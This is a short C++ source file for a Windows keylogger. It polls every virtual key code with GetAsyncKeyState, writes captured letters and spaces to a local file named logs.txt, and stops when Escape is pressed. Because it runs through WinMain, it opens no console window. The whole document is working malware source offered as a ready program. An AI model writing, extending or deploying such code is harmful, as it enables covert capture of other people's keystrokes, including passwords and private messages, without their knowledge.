#include <Windows.h>
#include <winuser.h>
#include <fstream>
#include <cctype>


int WINAPI WinMain(HINSTANCE hInst, HINSTANCE hPrev, LPSTR args, int nCmdShow) {
    
    std::ofstream log("logs.txt");

    //clears ghost input in logs
    for (int i{}; i < 256; ++i)
        GetAsyncKeyState(i);


    //input logger with memory leak
    while (!GetAsyncKeyState(VK_ESCAPE) && true) {

        for (int i{}; i < 256; ++i) {
            if (GetAsyncKeyState(i) & 0b1) {
                if (std::isupper(i))
                    log << (char)i;
                else if (GetAsyncKeyState(VK_SPACE))
                    log << " ";
            }
                
        }
        
    }
     



    MessageBoxW(0, L"Key Broadcast - OFF", L"Log", MB_OK);
    log.close();

    return 0;
}